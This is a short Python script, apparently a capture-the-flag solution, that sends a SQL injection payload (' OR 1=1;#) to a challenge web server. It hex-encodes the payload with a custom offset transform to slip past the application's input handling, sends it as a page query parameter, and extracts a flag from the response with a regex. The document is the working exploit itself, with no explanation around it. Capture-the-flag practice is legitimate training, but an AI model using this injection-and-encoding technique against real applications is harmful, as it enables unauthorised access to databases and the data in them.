#!/usr/bin/env python3
import requests
import re

baseurl = "http://targetlist.deadface.io:3001/pages?page="
payload = '" OR 1=1;#'

out = "1"
for c in payload:
    out += hex(ord(c) + 0x40 & 0x7F)[2:].zfill(2)

r = requests.get(baseurl + out)
flag = re.findall(r"flag\{[a-zA-Z0-9\-]*\}", r.text)[0]

print(flag)
